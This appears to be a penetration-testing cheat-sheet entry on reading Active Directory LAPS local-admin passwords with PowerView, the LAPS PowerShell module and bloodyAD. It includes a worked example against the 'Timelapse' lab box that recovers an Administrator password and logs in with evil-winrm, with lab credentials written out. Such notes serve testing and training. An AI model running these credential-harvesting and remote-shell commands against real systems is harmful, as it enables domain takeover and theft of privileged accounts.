# From Windows
Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:
```powershell
Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"
```
Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:
```powershell
Get-LapsADPassword "WIN10" -AsPlainText
```

# Linux Abuse
Read the LAPS password attributes listed in the General section.
Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:
```shell
sudo apt install bloodyad
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Example:
```shell
bloodyAD --host Timelapse -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
![image](https://github.com/user-attachments/assets/08b0b666-c164-4ece-ae96-f387b9b914b9)

```shell
evil-winrm -S -i Timelapse -u Administrator -p "6vf8f0T4a+2[@Mu1[6g66pHj"
```
**Note**:
The -S flag in evil-winrm is used to enable SSL (Secure Sockets Layer) for the connection. This flag is necessary when the target Windows machine's WinRM (Windows Remote Management) service is configured to use HTTPS instead of HTTP.
